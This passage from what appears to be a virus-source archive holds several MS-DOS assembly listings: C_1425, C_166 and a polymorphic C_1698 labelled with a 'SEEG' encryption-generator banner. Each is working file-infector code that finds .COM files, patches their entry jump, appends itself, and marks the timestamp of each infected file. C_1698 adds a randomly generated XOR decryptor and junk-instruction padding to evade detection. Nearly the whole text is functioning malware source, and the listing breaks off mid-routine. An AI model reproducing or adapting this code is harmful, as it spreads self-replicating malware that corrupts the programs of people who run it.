	Mov byte ptr [Si]+[Bx],Al
	Inc Bx
	Ret
Mes:
	Push	Dx
	Mov	Ah,09h
	Lea	Dx,Cop+[Bp]
	Int	21h
	Pop	Dx
	Ret

ort:
	Movsb
	Movsw
	ret
res:
	Cmp	Al,09h
	Jnz	d1
	Mov	Al,0ch
	Ret
d1:
	Cmp	Al,0ch
	Jnz	d2
	Mov	Al,09h
	Ret
d2:
	Cmp	Al,12h
	Jnz	d3
	Mov	Al,15h
	Ret
d3:
	Cmp	Al,15h
	Jnz	d4
	Mov	Al,12h
d4:
	Ret

rand:
	push    Ax
	Mov     ch,10h
	Xor     Cl,Cl
	Call    set
	Pop     Ax
	Push    Ax
	Mov     Cl,04h
	Call    set
	Pop     Ax
	Push    Ax
	Mov     Cl,08h
	Call    set
	Pop     Ax
	Push    Ax
	Mov     Cl,0ch
	Call    set
	Pop     Ax
	Ret

R_Vec24	       PROC
		Push	word ptr Vec24+[Bp]
		Pop	Ds
		Mov	Dx,word ptr Vec24+[Bp]+2
		Mov	Ax,2524h
		Int	21h
		Ret
R_Vec24	       ENDP

Set_Int_24:	Push	Ds
		Push	Bx
		Push	Dx
		Mov	Ax,3524h
		Int	21h
		Mov	word ptr Vec24+[Bp]+2,Bx
		Mov	word ptr Vec24+[Bp],Es
		Push	Cs
		Pop	Ds
		Mov	Ax,2524h
		Lea	Dx,intr24+[Bp]
		Int	21h
		Pop	Dx
		Pop	Bx
		Pop	Ds
		Ret

;Intr21	       PROC
;	db	09ah
;	vector	dd	?
;		ret
;Intr21	       ENDP

Intr24:
	Mov	Al,3h
	Iret

vit:
	Push	Si
	Push	Di
	Push	Si
	Lea     Si,tabl+[Bp]
	Add     Si,Ax
	Add	Di,Bx
	Call    ort
	Pop     Si
	Pop	Di
	Call    res
	Push	Di
	Push	Si
	Lea	Si,tabl+[Bp]
	Add	Si,Ax
	Mov     Di,600h ;-------------------------??????????
	Add	Di,Dx
	Call    ort
	Pop     Si
	Pop	Di
	Pop	Si
	Ret
mreg:
	Cmp	Al,01h
	Jnz	q1
	Jmp	Bx_r
q1:
	Cmp	Al,02h
	Jnz	Si_r
Di_r:
	Mov	byte ptr [Si]+04h,15h
	Mov	byte ptr [Si]+07h,35h
	Mov	byte ptr [Si]+0ah,05h
	Mov	byte ptr [Si]+0dh,0dh
	Mov	byte ptr [Si]+10h,1dh
	Mov	byte ptr [Si]+13h,05h
	Mov	byte ptr [Si]+16h,2dh
	Mov	byte ptr [Si]+18h,0bfh
	Mov	byte ptr [Si]+1bh,47h
	Mov	byte ptr [Si]+1dh,0ffh
	Ret
Si_r:
	Mov	byte ptr [Si]+04h,14h
	Mov	byte ptr [Si]+07h,34h
	Mov	byte ptr [Si]+0ah,04h
	Mov	byte ptr [Si]+0dh,0ch
	Mov	byte ptr [Si]+10h,1ch
	Mov	byte ptr [Si]+13h,04h
	Mov	byte ptr [Si]+16h,2ch
	Mov	byte ptr [Si]+18h,0beh
	Mov	byte ptr [Si]+1bh,46h
	Mov	byte ptr [Si]+1dh,0feh
	Ret
Bx_r:
	Mov	byte ptr [Si]+04h,17h
	Mov	byte ptr [Si]+07h,37h
	Mov	byte ptr [Si]+0ah,07h
	Mov	byte ptr [Si]+0dh,0fh
	Mov	byte ptr [Si]+10h,1fh
	Mov	byte ptr [Si]+13h,07h
	Mov	byte ptr [Si]+16h,2fh
	Mov	byte ptr [Si]+18h,0bbh
	Mov	byte ptr [Si]+1bh,43h
	Mov	byte ptr [Si]+1dh,0fbh
	Ret

gkey:
	Push	Dx
	Mov	[Si]+8h,Dl
	Mov	[Si]+0bh,Dh
	Mov	[Si]+0eh,Dh
	Add	Dh,Dl
	Mov	[Si]+14h,Dh
	Mov	[Si]+17h,Dh
	Pop	Dx
	Ret

;**************************************************** VIRUS START *************
Virus:
	Mov     ah,1ah
	Lea     Si,vir+[Bp]
	Mov	Dx,Si
	Add	Dx,0dh
	Int     21h
	Mov	Dx,Si
	Add     dx,1h
find_f:
	Mov     ah,4eh
	Mov     cx,00h
	Int     21h  
	jmp     ok
find_n:
	Mov     ah,4fh
	Int     21h

ok:
	jnb     chk
	cmp     al,12h
	jz      dg
	jmp     chk
dg:
	cmp     byte ptr [Bp]+dir,0ffh
	jnz     fg
	jmp     rt
fg:
	dec     dx
	Mov     byte ptr [Bp]+dir,0ffh
	jmp     find_f

chk:
	Mov     cx,[Bp]+offset date
	and     cx,001ah
	cmp     cx,001ah
	jz      find_n
	cmp     word ptr [Bp]+offset dlina,62000d
	ja      find_n
	cmp     word ptr [Bp]+offset dlina,100h
	jb      find_n
	push    si
	Mov     di,si
	Add     di,0dh 
	Add     si,02bh
	cmp     byte ptr [Bp]+dir,0ffh
	jnz     nam
	Mov     al,5ch
	stosb
nam:
	lodsb
	stosb
	cmp     al,00
	jnz     nam
	pop     Si
	Mov     dx,si
	Add     dx,00dh
	Mov	Cx,[Bp]+offset atrib
	Xor	Ch,Ch
	and     cx,0fffeh
	Mov     ax,4301h
	Int     21h
	Mov     ax,[Bp]+offset dlina ;====lengh of file to AX
	Sub     ax,0003h
	Mov     [Bp]+1h+offset new_j,ax ;==========new JMP to virus
	Mov     al,02h               
	Mov     ah,3dh
	Int     21h                   
	jnb     ar
	jmp     rt
ar:
	Mov     bx,ax
	Mov     ax,4200h
	Mov     cx,00h
	Mov     dx,00h
	Int     21h
	Mov     ah,3fh
	Mov     cx,0003h
	Lea     dx,buf_j+[Bp]
	Int     21h
	Mov	Di,offset buf_j+[Bp]
	Cmp	Di,'ZM'
	Jnz	infect
	Mov	Ah,3eh
	Int	21h
	Jmp	find_n
infect:
	Lea	Si,virn+[Bp]
	Mov	Di,22h
	Push	offset seg_new+[Bp]
	Pop	Es
	Mov	Cx,cod2_lng
	Rep	Movsb
	Mov     ax,4200h
	Xor     cx,cx
	Xor     dx,dx
	Int     21h
	Mov     ax,4000h
	Mov     cx,0003h
	Lea	Dx,new_j+[Bp]
	Int     21h
	Mov     ah,42h
	Mov     al,02h
	Xor	Cx,Cx
	Xor	Dx,Dx
	Int     21h
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
	Mov	Ah,2ch	;	    \
	Int	21h	;	     \
	Push	Ds	;	      \
	Mov	Cx,(Cod2_Lng /2d)-20h	;      \
	Mov	Si,85h		;	\
	Mov	Es:[23h],Dx ;		 \
My:				;         >---------> 1-Ô á†Ë®‰‡Æ¢™† 
	Xor	word ptr Es:[Si],Dx ;    /
	Inc	Si		    ;   /
	Sub	Dx,0DEADh
	Inc	Si		   ;   /
	Loop	My		  ;   /
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
	Push	Bx
	Xor	Ax,Ax
	Mov	Al,[Bp]+n_com
	Mov	Bl,03h
	Mul	Bl
	Add	Ax,03h
	Mov	word ptr d_dlina+[Bp],Ax
	Lea	Si,M1+[Bp]
	Xor	Di,Di
	MovSb
	Mov	Bx,offset dlina+[Bp]
	Add	Bx,Ax
	Add	Bx,107h
	Mov	Es:[01h],Bx
	Lea	Si,I1+[Bp]
	Mov	Di,Ax
	Cld
	MovSw
	MovSb
	MovSw
	MovSw
	Add	Bx,lng
	Mov	Si,Ax
	Add	Si,03h
	Mov	Es:[Si],Bx
	Add	Si,03h
	Xor	Bx,Bx
	Sub	Bx,Ax
	Sub	Bx,4h
	Mov	byte ptr Es:[Si],Bl
;-------------------------------	
	Pop	Bx
	Lea	Si,gat+[Bp]
	Mov	Di,5fdh
	MovSb
	MovSw
	Sub	Si,0dh
	Mov	Di,600h
	MovSb
	MovSw
	Lea	Si,I1+[Bp]
	Mov	Di,61bh
	MovSw
	MovSb
	MovSw
	MovSw
	Inc	Si
	Inc	Si
	MovSw	
	Push	Bx
	Cld
	Call	dword ptr cody+[Bp]
	Pop	Bx
dry:
	Xor	Dx,Dx
	Push	Es
	Pop	Ds

	Mov     Cx,Ax
	Add	Cx,7h
	Mov     ax,4000h
	Int     21h                   
	Mov     cx,cod2_lng
	Mov	Dx,22h
	Mov     ax,4000h
	Int     21h                   
;---------------------------------------------------------------------------

	Pop	Ds
	Mov     cx,[Bp]+offset time
	Mov     dx,[Bp]+offset date
	and     dx,0ff0eh
	or      dx,001ah
	Mov     ax,5701h
	Int     21h
	Mov     ah,3eh
	Int     21h

rt:
	Call	R_Vec24
	Mov	Ah,49h
	Push	Es
	Pop	Bx
	Int	21h
	Push	Cs
	Pop	Es
	Push	Es
	Pop	Ds
	Push	100h
	Xor     Ax,Ax
	Xor	Cx,Cx
	Xor     Dx,Dx
	Xor     Bx,Bx
	Ret
sc      ENDP
lng		=	$-Sc
Cod2_lng	=	$-Virn

END start
END
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_1425.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_166.ASM]ƒƒƒ
        .MODEL tiny
	.186
        .stack
        .code  
        org 100h
start:
       jmp sec
       nop
ser:
vir    DB "*.com",00h
jamp   DB 0e9h,000h,000h
jomp   DB 0cdh,020h,000h
sec:
       Call fig
Fig:
       Pop Bp
       Sub Bp,112h
       Mov Di,100h
       Lea Si,jomp+[Bp]
       Movsb
       Movsw
       mov ah,4eh
       Lea dx,vir+[Bp]
       int 21h
wer:
       Cmp byte ptr cs:[0a4h],'D'
       Jz fn
       Cmp byte ptr cs:[096h],33h
       Jnz late
fn:
       Mov ah,4fh
       Int 21h
       Cmp al,12h
       Jz lsd
       Jmp wer
late:
       Mov Ax,3d02h
       Mov Dx,09eh
       Int 21h
       Jz lsd
       Xchg Ax,Bx
       Mov Ax,4301h
       Mov Cx,0020h
       Int 21h
       Mov Ax,4200h
       Call lit
       Mov Ah,3fh
       Mov Cx,003h
       Lea Dx,jomp+[Bp]
       Int 21h
       Mov Ax,4200h
       Call lit
       Mov Ax,word ptr cs:[9ah]
       Add Ax,09h
       Mov word ptr Jamp+[Bp]+1,Ax
       Lea Dx,[Bp]+jamp
       Mov Ah,40h
       Mov Cx,03h
       Int 21h
       Mov Ax,4202h
       Call lit
       Lea Dx,[Bp]+ser
       Mov Ah,40h
       Mov Cx,0b2h
       Int 21h
       Mov Ax,5701h
       Mov Cl,33h
       Mov Dx,Cs:[88h]
       Int 21h
lsd:
       Mov word ptr Cs:[80h],0000h
       Mov Ah,3eh
       Int 21h
       Push 100h
       Ret


lit:
        Xor Cx,Cx
	Xor Dx,Dx
	Int 21h
	Ret

END start
END
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_166.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_1698.ASM]ƒƒƒ
;11:41am 10-29-1996
        .MODEL tiny
        .186
        .code
        org 100h
start:
        jmp     sc
        db      200d dup(08h)
sc     PROC
        db      90h,90h,90h     ;--- Mov {BX} {SI} {DI},START_DECODING  YYY
decod   db      90h,90h,90h     ;\                                      YYY
        db      90h,90h,90h     ; \                                     YYY
        db      90h,90h,90h     ;  \                                    YYY
        db      90h,90h,90h     ;   \___DECODER                         YYY
        db      90h,90h,90h     ;   /                                   YYY
        db      90h,90h,90h     ;  /                                    YYY
        db      90h,90h,90h     ; /                                     YYY
        db      90h,90h,90h     ;/                                      YYY
        db      90h             ;-- INC {BX} {SI} {DI}                  Y
        db      90h,90h,90h,90h ;-- CMP {BX} {SI} {DI},END_DECODING     NYYY
        db      90h,90h         ;-- JB  DECOD                           NY
Virn    PROC
        Mov     dx,0000h  ;--- KEY
        Mov     Sp,0fffeh
Virt:
        clc
        cld
        Push    Cs
        Pop     Ss
        Pushf
        Mov     Di,Sp
        Mov     Bx,[Di]
        Lahf
        Sub     Bx,Ax
        Xchg    Ax,Bx
        Xor     Al,Al
        Sub     Ah,70h
        Push    100h
        Xchg    Al,Ah
        Mov     Cx,4
        Push    Dx
        Mul     Cx
        Pop     Dx
        Sub     Di,Ax
        Mov     Ax,[Di]
        Sub     Ah,72h
        Xor     Al,Al
        Add     Dx,Ax
        Pop     Ax
        Pop     Ax
Virn    ENDP
        Call    opt
opt:    Pop     Bp
        Sub     Bp,offset opt
        Jmp     Cycl
Cd:
        Xor     Bx,Bx
        Jmp     Cycl
Cr:
        Mov     Bh,22h
Cycl:
        Lea     si,vir+[Bp]
        Mov     cx,lng /2d
        Push    Dx
crypt:
        Xor     word ptr [Si],Dx
        Inc     Si
        Sub     Dx,0deadh
        Inc     Si
        loop    crypt
        Pop     Dx
        Cmp     word ptr vir+[Bp],'?\'
        Jz      dr
        Cmp     Bh,22h
        Jne     Cr
        Inc     Dh
        Jmp     Cd
dr:
        jmp     late

vir     db      "\???????.COM",000h
des     db      "000000000000000000000" ;00h
atrib   db      "0"                     ;15h
time    db      "00"                    ;16h
date    db      "00"                    ;18h
dlina   db      "0000"                  ;1Ah
new_f   db      "000000000000"          ;1Eh
new_j   db      "È00"
buf_j   db      "Õ ê"
;------------------------------------------------------------------------------
tabl    db      052h, 0fch, 05ah ;\     Nop
        db      0f6h, 017h, 090h ; \    Not b,[??]      +
        db      080h, 037h, 000h ;  \   Xor b,[??],K1   +       Key#-
        db      0c0h, 007h, 000h ;   \  Rol b,[??],K2   +       Key\_
        db      0c0h, 00fh, 000h ;    \ Ror b,[??],K2   +       Key/
        db      0f6h, 01fh, 090h ;    / Neg b,[??]      +
        db      080h, 007h, 000h ;   /  Add b,[??],K3   +       Key\_
        db      080h, 02fh, 000h ;  /   Sub b,[??],K3   +       Key/
;----------------------------------/
M1      db      0bbh, 022h, 000h        ;---- [ MOV BX,xxxx ]
I1      db      043h                    ;---- [ INC BX ]
COM     db      081h, 0fbh, 0dbh, 06h   ;---- [ CMP xx,xxxx ]   +
J1      db      072h, 0e1h              ;---- [ JB xx ] e1 - 8
Gat     db      1eh
        db      06h
der     db      1fh
        db      0cbh
;-------------------------------------------------------------------------------------
Cop     db      0dh,0ah,"-= [SEEG] Serg_Enigma EncryptioN GeneratoR v1.0b =-",0dh,0ah,"$"
;-------------------------------------------------------------------------------------
one     db      00h  ;\
        db      00h  ; \
        db      00h  ;  \
        db      00h  ;   \___{ äÆ¨°®≠†Ê®Ô ™Æ¨¨†≠§ §´Ô ß†/‡†ßË®‰‡Æ¢È®™†
        db      00h  ;   /
        db      00h  ;  /
        db      00h  ; /
        db      00h  ;/
;-----------------------------------------------------------------------
dir     db      00h
cody    db      0fdh,06h
seg_new dd      ?
b_reg   db      ?
n_com   db      ?
d_dlina dd      ?
vec24   dd      ?
gar     db      00h,00h

late:
        Lea     Si,buf_j+[Bp]
        Mov     Di,0100h
        Movsb
        Movsw
        Mov     byte ptr dir+[Bp],00h
        Push    Es
        Call    Set_Int_24
        Pop     Es
        Mov     Ax,4900h
        Int     21h
        Jc      rt
        Mov     Ax,4800h
        Mov     Bx,0FFFFh
        Int     21h
        Sub     Bx,80h ;-------\
        Jc      rt
        Mov     Ax,4a00h
        Int     21h
        Mov     Ax,4800h
        Mov     Bx,7fh
        Int     21h
        Jc      Rt
        Mov     word ptr [Bp+seg_new],Ax
        Mov     Es,Ax
        Mov     Al,90h
        Xor     Di,Di
        Mov     Cx,7e0h
        Rep     Stosb
        Mov     Ah,2ch
        Int     21h
        Cmp     Dh,22h
        Jnz     drop
        Call    Mes
drop:
        Push    Es
        Call    G_gar
        Pop     Es
        Call    gkey  ;è‡ÆÊ•§„‡† £•≠•‡†Ê®® 3-•Â ™´ÓÁ•© ® ß†≠•·•≠®Ô ®Â ¢ ‚†°´®Ê„
        Lea     Si,one+[Bp]
        Mov     Ax,Dx
        Xor     Bx,Bx
        Call    rand
        Xor     Ax,1234h
        call    rand
        Mov     Ax,Word Ptr [Si]
        Xor     Ah,Ah
        Mov     Bl,02h
        Div     Bl
        Xor     Ah,Ah
        Mov     byte ptr [Bp]+b_reg,Al
        Push    Si
        Lea     Si,tabl+[Bp]
        Call    mreg    ; è‡ÆÊ•§„‡† ®Ì¨•≠•≠®Ô °†ßÆ¢ÎÂ ‡•£®·‚‡Æ¢ ¢ ‚†°´®Ê•
        Pop     Si
        Mov     ax,word ptr [Si]+01
        Cmp     al,00h
        Jnz     no
        Inc     Ax
no:
        Cmp     byte ptr [Si],00h
        Jnz     mo
        Inc     byte ptr [Si]
mo:
        Xor     Ah,Ah
        Mov     Bl,02h
        Div     Bl
        Xor     Ah,Ah
        Inc     Al
        Mov     byte ptr [Bp+n_com],Al
        Xchg    Cx,Ax
        Mov     Ax,word ptr [Bp+seg_new]
        Mov     Es,Ax
        Xor     Ch,Ch
        Xor     Ax,Ax
        Mov     Di,0003h
        Xor     Bx,Bx
        Mov     Dx,24d
Cycle:
        Call    Comp    ; É•≠•‡†Ê®Ô ØÆ·´•§Æ¢†‚•´Ï≠Æ·‚® ™Æ¨†≠§
        Inc     Si
        Add     Bx,0003h
        Sub     Dx,0003h
        Loop    Cycle
        Push    Cs
        Pop     Es
        Jmp     Virus
;------ èÆ§Ø‡Æ£‡†¨¨Î ----------------------------------------------------------
Comp:
        Cmp     byte ptr [Si],00h
        Jnz     Set_0
        Mov     Al,00d
        Jmp     vit
Set_0:
        Cmp     byte ptr [Si],01h
        Jnz     Set_1
        Mov     Al,03d
        Jmp     vit
Set_1:
        Cmp     byte ptr [Si],02h
        Jnz     Set_2
        Mov     Al,06d
        Jmp     vit
Set_2:
        Cmp     byte ptr [Si],03h
        Jnz     Set_3
        Mov     Al,09d
        Jmp     vit
Set_3:
        Cmp     byte ptr [Si],04h
        Jnz     Set_4
        Mov     Al,12d
        Jmp     vit
Set_4:
        Cmp     byte ptr [Si],05h
        Jnz     Set_5
        Mov     Al,15h
        Jmp     vit
Set_5:
        Cmp     byte ptr [Si],06h
        Jnz     Set_6
        Mov     Al,18d
        Jmp     vit
Set_6:
        Cmp     byte ptr [Si],07h
        Jnz     Set_7
        Mov     Al,21d
        Jmp     vit
Set_7:
        Cmp     byte ptr [Si],08h
        Jnz     Set_8
        Mov     Al,21d
        Jmp     vit
Set_8:
        Cmp     byte ptr [Si],09h
        Jnz     Set_9
        Mov     Al,18d
        Jmp     vit
Set_9:
        Cmp     byte ptr [Si],0ah
        Jnz     Set_a
        Mov     Al,15d
        Jmp     vit
Set_a:
        Cmp     byte ptr [Si],0bh
        Jnz     Set_b
        Mov     Al,12d
        Jmp     vit
Set_b:
        Cmp     byte ptr [Si],0ch
        Jnz     Set_c
        Mov     Al,09d
        Jmp     vit
Set_c:
        Cmp     byte ptr [Si],0dh
        Jnz     Set_d
        Mov     Al,06d
        Jmp     vit
Set_d:
        Cmp     byte ptr [Si],0eh
        Jnz     Set_e
        Mov     Al,03d
        Jmp     vit
Set_e:
        Cmp     byte ptr [Si],0fh
        Jnz     Set_f
        Mov     Al,00h
        Jmp     vit
Set_f:
        Jmp     rt

set:
        Rol Ax,Cl
        Xor Ah,Ah
        Div Ch
        Mov byte ptr [Si]+[Bx],Al
        Inc Bx
        Ret
Mes:
        Push    Dx
        Mov     Ah,09h
        Lea     Dx,Cop+[Bp]
        Int     21h
        Pop     Dx
        Ret

ort:
        Movsb
        Movsw
        ret
res:
        Cmp     Al,09h
        Jnz     d1
        Mov     Al,0ch
        Ret
d1:
        Cmp     Al,0ch
        Jnz     d2
        Mov     Al,09h
        Ret
d2:
        Cmp     Al,12h
        Jnz     d3
        Mov     Al,15h
        Ret
d3:
        Cmp     Al,15h
        Jnz     d4
        Mov     Al,12h
d4:
        Ret

rand:
        push    Ax
        Mov     ch,10h
        Xor     Cl,Cl
        Call    set
        Pop     Ax
        Push    Ax
        Mov     Cl,04h
        Call    set
        Pop     Ax
        Push    Ax
        Mov     Cl,08h
        Call    set
        Pop     Ax
        Push    Ax
        Mov     Cl,0ch
        Call    set
        Pop     Ax
        Ret

R_Vec24        PROC
                Push    word ptr Vec24+[Bp]
                Pop     Ds
                Mov     Dx,word ptr Vec24+[Bp]+2
                Mov     Ax,2524h
                Int     21h
                Ret
R_Vec24        ENDP

Set_Int_24:     Push    Ds
                Push    Bx
                Push    Dx
                Mov     Ax,3524h
                Int     21h
                Mov     word ptr Vec24+[Bp]+2,Bx
                Mov     word ptr Vec24+[Bp],Es
                Push    Cs
                Pop     Ds
                Mov     Ax,2524h
                Lea     Dx,intr24+[Bp]
                Int     21h
                Pop     Dx
                Pop     Bx
                Pop     Ds
                Ret

;Intr21        PROC
;       db      09ah
;       vector  dd      ?
;               ret
;Intr21        ENDP

Intr24:
        Mov     Al,3h
        Iret

vit:
        Push    Si
        Push    Di
        Push    Si
        Lea     Si,tabl+[Bp]
        Add     Si,Ax
        Add     Di,Bx
        Call    ort
        Pop     Si
        Pop     Di
        Call    res
        Push    Di
        Push    Si
        Lea     Si,tabl+[Bp]
        Add     Si,Ax
        Mov     Di,700h ;-------------------------??????????
        Add     Di,Dx
        Call    ort
        Pop     Si
        Pop     Di
        Pop     Si
        Ret
mreg:
        Cmp     Al,01h
        Jnz     q1
        Jmp     Bx_r
q1:
        Cmp     Al,02h
        Jnz     Si_r
Di_r:
        Mov     byte ptr [Si]+04h,15h
        Mov     byte ptr [Si]+07h,35h
        Mov     byte ptr [Si]+0ah,05h
        Mov     byte ptr [Si]+0dh,0dh
        Mov     byte ptr [Si]+10h,1dh
        Mov     byte ptr [Si]+13h,05h
        Mov     byte ptr [Si]+16h,2dh
        Mov     byte ptr [Si]+18h,0bfh
        Mov     byte ptr [Si]+1bh,47h
        Mov     byte ptr [Si]+1dh,0ffh
        Ret
Si_r:
        Mov     byte ptr [Si]+04h,14h
        Mov     byte ptr [Si]+07h,34h
        Mov     byte ptr [Si]+0ah,04h
        Mov     byte ptr [Si]+0dh,0ch
        Mov     byte ptr [Si]+10h,1ch
        Mov     byte ptr [Si]+13h,04h
        Mov     byte ptr [Si]+16h,2ch
        Mov     byte ptr [Si]+18h,0beh
        Mov     byte ptr [Si]+1bh,46h
        Mov     byte ptr [Si]+1dh,0feh
        Ret
Bx_r:
        Mov     byte ptr [Si]+04h,17h
        Mov     byte ptr [Si]+07h,37h
        Mov     byte ptr [Si]+0ah,07h
        Mov     byte ptr [Si]+0dh,0fh
        Mov     byte ptr [Si]+10h,1fh
        Mov     byte ptr [Si]+13h,07h
        Mov     byte ptr [Si]+16h,2fh
        Mov     byte ptr [Si]+18h,0bbh
        Mov     byte ptr [Si]+1bh,43h
        Mov     byte ptr [Si]+1dh,0fbh
        Ret

G_gar:
        Push    Dx
        Push    Cs
        Pop     Es
        Mov     Cx,Dx
        Shr     Cx,08
        Shl     Cl,04
        Mov     Ax,Cx
        Mov     Cx,Dx
        Shl     Cx,08
        Xchg    Ch,Cl
        Rol     Cl,04
        Shr     Cl,04
        Add     Cx,Ax
        Jp      l1
        Dec     Cx
        Jp      l1
        Dec     Cx
L1:
        Mov     Ax,Cx
        Mov     word ptr [Bp]+gar,Al
        Mov     Bl,2
        Div     Bl
        Xor     Ah,Ah
        Xchg    Ax,Cx
        Pop     Dx
        Push    Dx
        Lea     Di,konec+[Bp]+2
        Cld
cyl:
        Call    trash
        StoSw
        Add     Dx,0bedah
        Loop    cyl
        Dec     Di
        Dec     Di
        Mov     Ax,9090h
        StoSw
        Pop     Dx
        Ret
trash:
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ{ 1 }ƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
        Mov     Bx,Dx
Anot:   Shr     Bx,8
        Shr     Bx,4
        Rol     Bl,4
        Cmp     Bl,00h
        Jz      n1
        Cmp     Bl,10h
        Jz      n1
        Cmp     Bl,20h
        Jz      n1
        Cmp     Bl,30h
        Jz      n1
        Sub     Dx,2222h
        Mov     Bx,Dx
        Jmp     anot
n1:     Mov     Al,Bl
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ{ 2 }ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
        Mov     Bx,Dx
anot1:  Rol     Bx,4
        Shr     Bx,8
        Shr     Bx,4
        Cmp     Bl,2
        Jz      n2
        Cmp     Bl,4
        Jz      n2
        Cmp     Bl,10
        Jz      n2
        Cmp     Bl,11
        Jz      n2
        Cmp     Bl,12
        Jz      n2
        Sub     Dx,2222h
        Mov     Bx,Dx
        Jmp     anot1
n2:     Add     Al,Bl
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ{ 3 }ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
        Mov     Bx,Dx
Anot2:  Shr     Bx,8
        Shr     Bl,4
        Shl     Bl,4
        Cmp     Bl,00h
        Jz      n3
        Cmp     Bl,10h
        Jz      n3
        Cmp     Bl,20h
        Jz      n3
        Cmp     Bl,30h
        Jz      n3
        Cmp     Bl,0c0h
        Jz      n3
        Cmp     Bl,0d0h
        Jz      n3
        Cmp     Bl,0f0h
        Jz      n3
        Sub     Dx,2222h
        Mov     Bx,Dx
        Jmp     anot2
n3:     Mov     Ah,Bl
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ{ 4 }ƒƒƒƒƒƒƒƒƒƒƒ¥
        Mov     Bx,Dx
Anot3:  Shl     Bx,8
        Shl     Bh,4
        Ror     Bh,4
        Cmp     Bh,6
        Jnz     n4
        Cmp     Bh,12
        Jnz     n4
        Cmp     Bh,14
        Jnz     n4
        Sub     Dx,2222h
        Mov     Bx,Dx
        Jmp     Anot3
n4:     Add     Ah,Bh
        ret
gkey:
        Push    Dx
        Mov     [Si]+8h,Dl
        Mov     [Si]+0bh,Dh
        Mov     [Si]+0eh,Dh
        Add     Dh,Dl
        Mov     [Si]+14h,Dh
        Mov     [Si]+17h,Dh
        Pop     Dx
        Ret

;**************************************************** VIRUS START *************
Virus:
        Mov     ah,1ah
        Lea     Si,vir+[Bp]
        Mov     Dx,Si
        Add     Dx,0dh
        Int     21h
        Mov     Dx,Si
        Inc	Dx	;Add     dx,1h
find_f:
        Mov     ah,4eh
        Xor     Cx,Cx
        Int     21h
        jmp     ok
find_n:
        Mov     ah,4fh
        Int     21h

ok:
        jnb     chk
        cmp     al,12h
        jz      dg
        jmp     chk
dg:
        cmp     byte ptr [Bp]+dir,0ffh
        jnz     fg
        jmp     rt
fg:
        dec     dx
        Mov     byte ptr [Bp]+dir,0ffh
        jmp     find_f

chk:
        Mov     cx,[Bp]+offset date
        and     cx,001ah
        cmp     cx,001ah
        jz      find_n
        cmp     word ptr dlina+[Bp],62000d
        ja      find_n
        cmp     word ptr dlina+[Bp],0100h
        jb      find_n
        push    si
        Mov     di,si
        Add     di,0dh
        Add     si,02bh
        cmp     byte ptr [Bp]+dir,0ffh
        jnz     nam
        Mov     al,5ch
        stosb
nam:
        lodsb
        stosb
        cmp     al,00
        jnz     nam
        pop     Si
        Mov     dx,si
        Add     dx,00dh
        Mov     Cx,[Bp]+offset atrib
        Xor     Ch,Ch
        and     cx,0fffeh
        Mov     ax,4301h
        Int     21h
        Mov     ax,[Bp]+offset dlina ;====lengh of file to AX
        Sub     ax,0003h
        Mov     [Bp]+1h+offset new_j,ax ;==========new JMP to virus
        Mov     al,02h
        Mov     ah,3dh
        Int     21h
        jnb     ar
        jmp     rt
ar:
        Mov     bx,ax
        Mov     ax,4200h
        Xor	Cx,Cx
	Cwd	;        Xor     Dx,Dx
        Int     21h
        Mov     ah,3fh
        Mov     cx,0003h
        Lea     dx,buf_j+[Bp]
        Int     21h
        Mov     Di,offset buf_j+[Bp]
        Cmp     Di,'ZM'
        Jnz     infect
        Mov     Ah,3eh
        Int     21h
        Jmp     find_n
infect:
        Lea     Si,virn+[Bp]
        Mov     Di,22h
        Push    word ptr seg_new+[Bp]
        Pop     Es
        Mov     Cx,cod2_lng
        Rep     Movsb
        Mov     ax,4200h
        Xor     cx,cx
	Cwd	;        Xor     dx,dx
        Int     21h
        Mov     ah,40h
        Mov     cx,0003h
        Lea     Dx,new_j+[Bp]
        Int     21h
        Mov     ah,42h
        Mov     al,02h
        Xor     Cx,Cx
	Xor     Dx,Dx
        Int     21h
        Mov     Ah,40h
        Lea     Dx,konec+[Bp]+2
        Mov     Cx,word ptr gar+[Bp]
        Dec     Cx
        Xor     Ch,Ch
        Int     21h
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
        Mov     Ah,2ch  ;          \
        Int     21h     ;            \
        Push    Ds      ;              \
        Mov     Cx,(Cod2_Lng /2d)-20h ;  \
        Mov     Si,8ah          ;          \
        Mov     Es:[23h],Dx ;                \
My:                             ;              >---------> 1-Ô á†Ë®‰‡Æ¢™†
        Xor     word ptr Es:[Si],Dx ;        /
        Inc     Si                  ;      /
        Sub     Dx,0DEADh	    ;    /
        Inc     Si                 ;   /
        Loop    My                ;  /
